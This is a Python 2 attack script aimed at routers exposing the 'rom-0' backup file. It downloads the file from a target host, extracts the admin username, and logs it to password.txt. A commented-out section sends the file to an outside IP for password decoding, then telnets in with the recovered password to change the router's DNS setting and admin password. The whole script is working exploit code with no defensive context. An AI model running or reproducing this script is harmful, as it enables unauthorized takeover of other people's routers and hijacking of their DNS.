from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from netaddr import IPNetwork
import urllib2
import urllib
import re
import getpass
import sys
import telnetlib
import time
import os
import socket
import sys
import time
socket.setdefaulttimeout(4)

register_openers()

try:
    os.remove("rom-0")
except:
    pass
try:    
    host=str(sys.argv[1])
    urllib.urlretrieve ("http://"+host+"/rom-0", "rom-0")
    fin = open('rom-0', 'rb')
    data = fin.read()
    m = re.search('sys adminname (.*)', data)   #search str "sys adminname....\n"
    fin.close()

    fout = open('password.txt', 'ab')
    fout.write(sys.argv[1] + "\n")
    if m:
        user = m.group(1)
        fout.write("Username: " + user + "\n")  
    fout.close()

    os.system("laypass.exe")
    time.sleep(3)
    
    
#    datagen, headers = multipart_encode({"uploadedfile": open("rom-0","rb")})
#
#    request = urllib2.Request("http://50.57.229.26/decoded.php", datagen, headers)
#
#    str1 =  urllib2.urlopen(request).read()
#    print str1
#    m = re.search('rows=10>(.*)', str1)
#    if m:
#        found = m.group(1)   
#    tn = telnetlib.Telnet(host, 23, 3)         
#    tn.read_until("Password: ") 
#    tn.write(found + "\n") 
#    tn.write("set lan dhcpdns 8.8.8.8\n")
#    tn.write("sys password XXXXXX\n")
#    print host+" -> Success" + " -> Pass: " + found
#    tn.write("exit\n")
except:
    print host+" -> Offline!"
